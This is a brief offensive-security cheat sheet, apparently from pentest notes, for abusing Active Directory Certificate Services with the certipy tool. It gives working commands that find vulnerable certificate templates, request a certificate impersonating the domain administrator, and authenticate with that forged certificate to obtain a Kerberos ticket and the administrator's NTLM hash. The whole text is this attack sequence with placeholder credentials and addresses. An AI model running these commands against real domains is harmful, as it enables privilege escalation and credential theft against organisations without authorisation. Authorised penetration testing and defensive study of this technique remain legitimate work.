
#### Find vulnerable Certificate Templates

```ruby
certipy find -u 'username@domain.local' -p 'password' -dc-ip <ip> -vulnerable
```

#### Request a certificate

After finding a vulnerable template 

```ruby
certipy req -u 'username@domain.local' -p 'password' -ca 'CA-NAME' -template 'VulnerableTemplate' -upn 'administrator@domain.local' -dc-ip 192.168.1.100
```

#### Authenticate using a forged certificate

Once you have a `.pfx` certificate file for an administrator, you can request a TGT (Ticket Granting Ticket) to obtain their NTLM hash.

```ruby
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.100
```

